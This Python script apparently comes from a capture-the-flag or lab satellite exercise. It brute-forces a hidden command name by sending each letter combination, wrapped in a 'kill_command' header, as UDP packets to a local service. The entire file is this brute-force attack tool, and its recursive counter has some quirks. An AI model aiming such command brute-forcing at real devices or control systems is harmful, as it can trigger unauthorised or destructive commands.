import socket
import sys 
import time
###############################################################################################
###############################################################################################
##################     ###     ###   #   #   ###    #####  ###    #  ##########################
##################     #  #   #   #  ##  #  #       #      #  #   #  ##########################
##################     #   #  #   #  # # #  #  ###  ###    ###    #  ##########################
##################     #  #   #####  #  ##  #   #   #      #  #      ##########################
##################     ###    #   #  #   #   ###    #####  #   #  #  ##########################
###############################################################################################
####### This could mess your PC up if it is not powerful enough/doesn't have enough memory ####
################ Change the number at your own risk ###########################################
sys.setrecursionlimit(4000)
###############################################################################################


#function to take the currently tested command and send it
def sendCommand(com):
    time.sleep(.0005) #################### TIME DELAY #################################
#   Completion Times:
#   .05    = ~200 hrs
#   .005   = ~20  hrs
#   .0005  = ~2   hrs
#   .00005 = ~12  min  !!!! Not Necessarily Stable  !!!!
#
    kill_command = [0x18, 0x06, 0xC0, 0x00, 0x00, 0x015, 0x31, 0x05] #the basic command being sent
    for i in com:
        kill_command.append(i) #append the current command being sent
    kill_command.append(0x00) #append the null terminator
    #print(kill_command) #test purposes
    #send the command to the sat
    byte_message = bytes(kill_command)
    opened_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    opened_socket.sendto(byte_message, ("127.0.0.1", 1234))
    return




#     A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, _
alphaList = [0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x0A, 0x5F]

comNum = [0]

def comCreator(comNum):
    if len(comNum) == 6:
        return
    sentCom = []
    for i in comNum:
        sentCom.append(alphaList[i])
        #print(sentCom)
    sendCommand(sentCom)

    #Increasing Value recursively
    comNum[-1] = comNum[-1] + 1
    for i in range(len(comNum)):
        j = (len(comNum) - i - 1)
        print(i, j, len(comNum))
        if comNum[j] == 27:
            if j == 0:
                comNum.append(0)
                comNum[0] = 0
                print(comNum)
                return comCreator(comNum)
            else:
                comNum[j] = 0
                comNum[j-1] += 1
                print(comNum)
                return comCreator(comNum)
    print(comNum)
    return comCreator(comNum)
    
    

        
#call the function
comCreator([0])
